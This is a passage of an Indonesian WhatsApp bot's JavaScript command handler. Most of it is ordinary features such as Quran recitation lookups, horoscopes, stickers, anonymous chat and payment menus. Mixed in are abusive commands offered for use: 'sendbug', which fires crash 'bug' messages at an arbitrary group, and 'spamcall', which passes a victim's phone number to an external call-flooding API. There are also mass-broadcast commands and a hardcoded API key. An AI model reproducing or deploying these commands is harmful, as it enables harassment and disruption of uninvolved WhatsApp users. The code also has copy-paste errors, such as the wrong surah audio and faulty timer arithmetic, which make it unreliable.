				   quran = `Surah Al-Qur\`an Nomor: 17\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================
 case 'al-kahfi':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=18&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 18\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================   
 case 'maryam':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=19&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 19\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break 
//===========================================================
case 'al-qariah':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=101&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 101\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/101?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//===========================================================
case 'at-takasur':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=102&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 102\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/102?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//===========================================================   
case 'al-ashr':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=103&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 103\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/103?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break   
//=========================================================== 
case 'al-humazah':
anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=104&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 104\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/104?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 
case 'al-fil':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=105&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 105\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/105?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 

case 'quraisy':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=106&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 106\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/106?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 
case 'al-maun':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=107&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 107\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/107?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 
case 'al-kausar':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=108&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 108\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/108?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 
case 'al-kafirun':

anu = await fetchJson(`https://api.zeks.xyz/api/quran?no=109&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 109\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/109?apikey=${setting.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 
case 'an-nashr':

                    anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=110&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 110\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
			        quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                     buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/110?apikey=${setting.lolkey}`)
                     reply(quran.trim())
                     wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                 break
//=========================================================== 
case 'al-lahab':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=111&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 111\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

   buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/111?apikey=${setting.lolkey}`)
   reply(quran.trim())
   wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
   break
//=========================================================== 
case 'al-ikhlas':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=112&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 112\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

     buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/112?apikey=${setting.lolkey}`)
     reply(quran.trim())
     wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
     break
//===========================================================  
case 'al-falaq':

                    anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=113&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 113\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu.ayat) {
					quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/113?apikey=${setting.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                   break   
 //===========================================================
 case 'an-nas':

 anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=114&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 114\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu.ayat) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

 buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/114?apikey=${setting.lolkey}`)
 reply(quran.trim())
 wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
case 'zodiak':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  if (args.length == 0) return reply(`Example: ${prefix + command} leo`)
  ini_text = args.join(" ")
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/zodiak/${ini_text}?apikey=WannOff`)
  reply(get_result.result)
  break                   
//=========================================================
case 'jodoh':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
                 if (args.length == 0) return reply(`Example: ${prefix + command} Tahu & Bacem`)
                 ini_nama = args.join(" ").split("&")
                 nama1 = ini_nama[0].trim()
                 nama2 = ini_nama[1].trim()
                 get_result = await fetchJson(`https://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${setting.lolkey}`)
                 get_result = get_result.result
                 ini_txt = `Positif : ${get_result.positif}\n`
                 ini_txt += `Negative : ${get_result.negatif}\n`
                 ini_txt += `Deskripsi : ${get_result.deskripsi}`
                 reply(ini_txt)
                 break
//=========================================================
case 'jadian2':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
         jds = []
         jdii = groupMembers
         koss = groupMembers
         akuu = jdii[Math.floor(Math.random() * jdii.length)]
         diaa = koss[Math.floor(Math.random() * koss.length)]
         teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
         jds.push(akuu.jid)
         jds.push(diaa.jid)
         mentions(teks, jds, true)
         break
//================================================================
  case 'jadian':
         if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
                      if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
                      tanggal = args[0]
                      bulan = args[1]
                      tahun = args[2]
                      get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadian/${tanggal}/${bulan}/${tahun}?apikey=${setting.lolkey}`)
                      get_result = get_result.result
                      ini_txt = `Karakteristik : ${get_result.karakteristik}\n`
                      ini_txt += `Deskripsi : ${get_result.deskripsi}`
                      reply(ini_txt)
                      break    
//======================================================                     
case 'weton':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
               tanggal = args[0]
               bulan = args[1]
               tahun = args[2]
               get_result = await fetchJson(`http://api.lolhuman.xyz/api/weton/${tanggal}/${bulan}/${tahun}?apikey=${setting.lolkey}`)
               get_result = get_result.result
               ini_txt = `Weton : ${get_result.weton}\n`
               ini_txt += `Pekerjaan : ${get_result.pekerjaan}\n`
               ini_txt += `Rejeki : ${get_result.rejeki}\n`
               ini_txt += `Jodoh : ${get_result.jodoh}`
               reply(ini_txt)
               break
case 'bcgc':
  if (!isOwner && !wann.key.fromMe) return reply(mess.only.owner)
       if (args.length < 1) return reply('pesannya mana?')
  anu = await groupMembers
  nom = anu.participant
    if (isMedia && !wan.message.videoMessage || isQuotedImage) {
  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(cok).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan
  bufferzzz = await wann.downloadMediaMessage(encmedia)
  for (let _ of anu) {
  wann.sendMessage(_.jid, bufferzzz, image, {caption: `「 BC GROUP 」\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`})
  }
  reply('')
  } else {
  for (let _ of anu) {
  sendMess(_.jid, `「 BC GROUP 」\n\nDari Grup : ${groupName}\nPengirim : wa.me/${(sender.split('@')[0])}\nPesan : ${body.slice(6)}`)
  }
  reply('Sukses broadcast group')
  }
  break
case 'bcsticker':
case 'bcstik':
					if (!wan.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.owner)
					anu = await wann.chats.all()
					if (isMedia && !wan.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan
						bc = await wann.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							wann.sendMessage(_.jid, bc, sticker, {quoted:wan})
						}
						fakestatus('Suksess broadcast')
					}
					break
			case 'bcimage':
					if (!wan.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.owner)
          if (args.length < 1) return reply(mess.only.owner)
					arg = args.join(' ');
					anu = await wann.chats.all()
					if (isMedia && !wan.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan					
					bc = await wann.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					wann.sendMessage(_.jid, bc, image, {quoted:wan ,caption: `「  *BROADCAST * 」\n\n${arg}`})
					}
					reply(mess.only.owner)
					} else {
					await ini_bc_pc_bang(arg)
					reply(mess.only.owner)
					}
					break

case 'bcvideo':
					if (!wan.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.owner)
					anu = await wann.chats.all()
					if (isMedia && !wan.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan
						bc = await wann.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							wann.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: wan,caption: `[ *${setting.botName} BROADCAST* ]\n\n${body.slice(9)}`})
						}
            reply(mess.only.owner)
					}
					break


 case 'sendbug':


 if (args.length < 1) return reply(`Penggunaan ${command} idgroup`)



wann.sendBugGC(args[1], WA_DEFAULT_EPHEMERAL)



 wann.sendBugGC(args[1], 0)



 wann.sendBugGC(args[1], 999)



 textImg('done owner')



 break



 case "typepdf":



 wann.sendMessage(from, "Reply this text with nhentai code\n\nNote : Reply this text only with number!", text, {quoted: wan, messageId: "PDF"+createSerial(8)})



 break



 case "nocode":



 wann.sendMessage(from, "Reply this text with nhentai gotoubun example title\n\nNote : Reply this text !", text, {quoted: wan, messageId: "NOCODE"+createSerial(8)})



 break



 case "cadangan":



 wann.sendMessage(from, "Reply this message with query\n\nExample : Gotoubun", text, {quoted: wan, messageId: "CARI"+createSerial(8)})



 break



 case "typeimage":



 wann.sendMessage(from, "Reply this text with nhentai code\n\nNote : Reply this text only with number!", text, {quoted: wan, messageId: "IMAGE"+createSerial(8)})



 break



 case "nhentai1":



 buttons = [{buttonId: noprefix ? "typepdf" : "!"+"typepdf",buttonText:{displayText: 'PDF'},type:1},{buttonId:noprefix ? "typeimage" : "!"+"typeimage", buttonText:{displayText:'IMAGE'},type:1}]



 buttonsMessage = {



contentText: `Choose your type, your want i send image or pdf?`,



footerText: 'Nhentai Downloader',



buttons: buttons,



headerType: 1



 }



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{})



 wann.relayWAMessage(prep)



 break



 case "nhentai":



 buttons = [{buttonId: noprefix ? "cadangan" : "!"+"cadangan",buttonText:{displayText: 'NO'},type:1},{buttonId:noprefix ? "nhentai1" : "!"+"nhentai1", buttonText:{displayText:'YES'},type:1}]



 buttonsMessage = {



contentText: `Do you have the code or not?`,



footerText: 'Nhentai Downloader',



buttons: buttons,



headerType: 1



 }



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{})



 wann.relayWAMessage(prep)



 break

 

case 'price':

        wann.sendMessage(from, list_price(prefix), text, {quoted: ftoko, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})

        break

       

        case 'pay':



list = []



listmenu = [`gopay`,`dana`,`qris`,`pulsa`]



listmenuu = [`BAYAR DENGAN GOPAY`,`BAYAR DENGAN DANA`,`BAYAR DENGAN QRIS ALLPAY`,`BAYAR DENGAN PULSA`]



nombor = 1



startnum = 0



for (let x of listmenu) {



  const yy = {title: 'menu ke' + nombor++,



  rows: [



  {



title: `${listmenuu[startnum++]}`,



description: ``,



rowId: `${prefix}${x}`



 }



 ]



  }



  list.push(yy)



}



listmsg(from, `${ucapanWaktu} ${pushname} 👋

  I am ${ownerName}

  Berikut Adalah Payment  kami😁😁



  `,`🐣 Day : ${week} ${weton}\n🐥 Date : ${date}  `, list, { quoted: freply})



break



        case 'aov':

        sendButMessage(from, list_aov(prefix), `${ownerName}`, [

            {

              buttonId: noprefix ? "pay" : "!"+"pay",

              buttonText: {

                displayText: `Payment`,

              },

              type: 1,

            }]);

        break;

        case 'cod':

        sendButMessage(from, list_cod(prefix), `${ownerName}`, [

            {

              buttonId: noprefix ? "pay" : "!"+"pay",

              buttonText: {

                displayText: `Payment`,

              },

              type: 1,

            }]);

        break;

        case 'ff':

        sendButMessage(from, list_dmff(prefix), `${ownerName}`, [

            {

              buttonId: noprefix ? "pay" : "!"+"pay",

              buttonText: {

                displayText: `Payment`,

              },

              type: 1,

            }]);

        break;

        case 'sausage':

        sendButMessage(from, list_sausage(prefix), `${ownerName}`, [

            {

              buttonId: noprefix ? "pay" : "!"+"pay",

              buttonText: {

                displayText: `Payment`,

              },

              type: 1,

            }]);

        break;

        case 'lol':

        sendButMessage(from, list_lol(prefix), `${ownerName}`, [

            {

              buttonId: noprefix ? "pay" : "!"+"pay",

              buttonText: {

                displayText: `Payment`,

              },

              type: 1,

            }]);

        break;

        case 'valo':

        sendButMessage(from, list_valo(prefix), `${ownerName}`, [

            {

              buttonId: noprefix ? "pay" : "!"+"pay",

              buttonText: {

                displayText: `Payment`,

              },

              type: 1,

            }]);

        break;

 case 'owner': case 'creator':



 sendKontak(from, `${owner}`, `${ownerName}`, 'Sibukk!!')



 await sleep(1000)



 txtt =`Hai Kak ${pushname}\nItu Ownerku, Mau tau soal apa ya?`







 buttons = [{buttonId: noprefix ? "sou" : "!"+"sourcecode",buttonText:{displayText: 'SC BOT'},type:1},{buttonId:noprefix ? "infoig" : "!"+"infoig", buttonText:{displayText:'INSTAGRAM'},type:1}]



 buttonsMessage = {



contentText: `${txtt}`,



footerText: 'Jangan Sungkan Chat Ya Kak',



buttons: buttons,



headerType: 1



 }



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{})



 wann.relayWAMessage(prep)



 break



 case 'spamcall':{



if (!isPremium) return reply(mess.OnlyPrem)



  if (args.length > 1) return reply(`Cara penggunaan : ${command} no hp`)



 if (isNaN(args[1]) && args[1].startsWith('62')) return reply(`Harus berupa angka dan pastikan tidak memasukkan kode negara, contoh: ${command} 8127668234`)



fetchJson(`https://api.zeks.xyz/api/spamcall?apikey=chika-key&no=${args[1]}`)



 .then((data) => {



textImg(data.result.logs)



 })



 .catch((err) => {



sendMess(ownerNumber, `${command} Error:` + err)



reply(mess.error.api)



 })



  }



  break



  case 'next': case "stop": {



 if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')



wann.anonymous = wann.anonymous ? wann.anonymous: {}



 let room = Object.values(wann.anonymous).find(room => room.check(sender))



 if (!room) {



await wann.sendButton(from, '_Kamu tidak sedang berada di anonymous chat_', `${wann.user.name}`, 'Cari Partner', prefix+'start')



return false



 }



 reply('_You stopped matchmaking_')



 let other = room.other(sender)



 if (other) await wann.sendButton(other, '_Partner meninggalkan chat_', `${wann.user.name}`, 'Cari Partner', prefix+'start')



delete wann.anonymous[room.id]



 if (command === 'leave' || command === "stop") break



  }







case 'mulai': case 'start': case "anonymous": case "mutual": {



  if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')



 wann.anonymous = wann.anonymous ? wann.anonymous: {}



  if (Object.values(wann.anonymous).find(room => room.check(sender))) {



 await wan.sendButton(from, '_Kamu masih berada di dalam anonymous chat, menunggu partner_', `${wann.user.name}`, 'Keluar', `${prefix}leave`)



 return false



  }



  let room = Object.values(wann.anonymous).find(room => room.state === 'WAITING' && !room.check(sender))



  if (room) {



 await wann.sendButton(room.a, '_Partner ditemukan!_', `${wann.user.name}`, 'Next', prefix+'next')



 room.b = sender



 room.state = 'CHATTING'



 await wann.sendButton(room.b, '_Partner ditemukan!_', `${wann.user.name}`, 'Next', prefix+'next')



  } else {



 let id = + new Date



 wann.anonymous[id] = {



id,



a: sender,



b: '',



state: 'WAITING',



check: function (who = '') {



  return [this.a,



  this.b].includes(who)



},



other: function (who = '') {



  return who === this.a ? this.b: who === this.b ? this.a: ''



},



 }



 await wann.sendButton(from, '_Menunggu partner..._', `${wann.user.name}`, 'Keluar', prefix+'leave')



  }



  break



}



case 'bucinstick':



case'bucinsticker':{







  var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')



  var wifegerak = ano.split('\n')



  var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]



  var isGif = wifegerakx.endsWith('.gif') ? true : false



  if (!isGif) {



 var ngebuff = await getBuffer(wifegerakx)



 var media = getRandom('.png')



 fs.writeFileSync(media, ngebuff)



 await ffmpeg(`${media}`)



 .input(media)



 .on('start', function (cmd) {



console.log(`Started : ${cmd}`)



 })



 .on('error', function (err) {



console.log(`Error : ${err}`)



fs.unlinkSync(media)



reply(mess.error.api)



 })



 .on('end', function () {



console.log('Finish')



exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {



  if (error) return reply(mess.error.api)



wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})







 fs.unlinkSync(media)	



 fs.unlinkSync(`./sticker/${sender}.webp`)	



  })



 })



 .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



 .toFormat('webp')



 .save(`./sticker/${sender}.webp`)



  } else {



var ngebuff = await getBuffer(wifegerakx)



let media = `./sticker/${sender}.gif`



fs.writeFileSync(media, ngebuff)



reply(mess.wait)



await ffmpeg(`${media}`)



.inputFormat(media.split('.')[4])



.on('start', function (cmd) {



 console.log(`Started : ${cmd}`)



  })



.on('error', function (err) {



 console.log(err)



 fs.unlinkSync(media)



 let tipe = media.endsWith('.mp4') ? 'video' : 'gif'



 reply(mess.error.api)



  })



.on('end', function () {



 console.log('Finish')



 exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {



  if (error) return reply(mess.error.api)



 wann.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: freply})







  fs.unlinkSync(media)



  fs.unlinkSync(`./sticker/${sender}.webp`)



})



  })



.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])



.toFormat('webp')



.save(`./sticker/${sender}.webp`)



 }



  }



  break
  
  //=============================================================================
case 'closetime':  
        if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !wan.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		 
        reply('AKSES WAKTU DIPROSES')   	
                wann.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'0000'
				} else if (args[1]=='jam') {var timer = args[0]+'0000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = wan.participant
				let close = {
				text: `*ᴛᴇᴘᴀᴛ ᴡᴀᴋᴛᴜ* ɢʀᴜᴘ ᴅɪᴛᴜᴛᴜᴘ ᴏʟᴇʜ ᴀᴅᴍɪɴ @${nomor.split('@s.whatsapp.net')[0]}\nꜱᴇᴋᴀʀᴀɴɢ *ʜᴀɴʏᴀ ᴀᴅᴍɪɴ* ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇꜱᴀɴ`,
				contextInfo: { mentionedJid: [nomor] }
				}
				wann.groupSettingChange (from, GroupSettingChange.messageSend, true);
				reply(close)
				}, timer)
				break 
		     	case 'opentime':  
		     	if (!isBotGroupAdmins) return reply('Bot not admin');
        if (!isGroupAdmins && !wan.key.fromMe) return reply('Khusus admin');
        if (!isGroup) return reply('Khusus di grup');		    
                reply('AKSES WAKTU DIPROSES')   
                wann.updatePresence(from, Presence.composing) 
                if (args[1]=='detik') {var timer = args[0]+'000'
				} else if (args[1]=='menit') {var timer = args[0]+'00000'
				} else if (args[1]=='jam') {var timer = args[0]+'00000'
				} else {return reply('*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik')}
				setTimeout( () => {
				var nomor = wan.participant
				let open = {
				text: `*ᴛᴇᴘᴀᴛ ᴡᴀᴋᴛᴜ* ɢʀᴜᴘ ᴅɪʙᴜᴋᴀ ᴏʟᴇʜ ᴀᴅᴍɪɴ @${nomor.split('@s.whatsapp.net')[0]}\nꜱᴇᴋᴀʀᴀɴɢ *ᴍᴇᴍʙᴇʀ* ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ᴘᴇꜱᴀɴ`,
				contextInfo: { mentionedJid: [nomor] }
				}
				wann.groupSettingChange (from, GroupSettingChange.messageSend, false);
				reply(open)
				}, timer)
				break  
case 'bc3':
      case 'bcbutton':
             if (!isOwner) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu = await wann.chats.all()
             if (isMedia && !wann.message.videoMessage || isQuotedImage) {
             let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo : wan
             bc2 = await wann.downloadMediaMessage(encmedia)
             for (let _ of anu) {
             wann.sendMessage(_.jid, { contentText: `${body.slice(4)}`, footerText: watermark, buttons: [{ buttonId: `${prefix}command`, buttonText: { displayText: 'MENU' }, type: 1 }, { buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 }], headerType: 6, locationMessage: { degreesLatitude: 0, degreesLongitude: 0, jpegThumbnail: bc2 }}, 'buttonsMessage')
}
